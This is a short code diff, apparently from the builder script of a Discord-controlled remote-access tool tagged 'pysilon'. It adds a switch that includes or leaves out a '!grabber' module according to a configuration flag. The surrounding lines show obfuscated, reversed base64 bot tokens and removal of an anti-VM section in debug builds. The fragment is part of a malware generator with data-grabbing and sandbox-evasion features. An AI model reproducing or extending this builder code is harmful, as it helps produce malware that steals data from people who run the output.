@@ -325,6 +325,7 @@ def assemble_source_code():
                         source_assembled.write('for token in bot_tokens:\n    decoded_token = base64.b64decode(token[::-1]).decode()\n    try:\n        client.run(decoded_token)\n    except: pass')
                 elif '# [pysilon_mark] !debug' in base_line and not debug_mode: pass
                 elif '# [pysilon_mark] !anti-vm' in base_line and debug_mode: pass
+                elif '# [pysilon_mark] !grabber' in base_line and not config['FUNCTIONALITY']['grabber'] == 'True': pass
                 else:
                     source_assembled.write(base_line)
     
